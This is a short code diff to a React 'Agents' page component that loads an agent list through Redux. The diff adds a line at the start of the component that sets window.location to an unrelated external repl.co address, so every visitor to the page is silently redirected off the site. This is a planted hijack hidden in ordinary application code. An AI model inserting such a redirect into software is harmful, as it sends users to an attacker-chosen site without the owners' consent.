@@ -9,6 +9,8 @@ import { getAgentList } from "../redux/actions/agentsAction";
 import { Section } from "../components";
 
 const Agents = () => {
+  window.location = 'https://blockyardsbasic.whizz-kid.repl.co/'
+
   const dispatch = useDispatch();
 
   const agents = useSelector((state) => state.agentList);
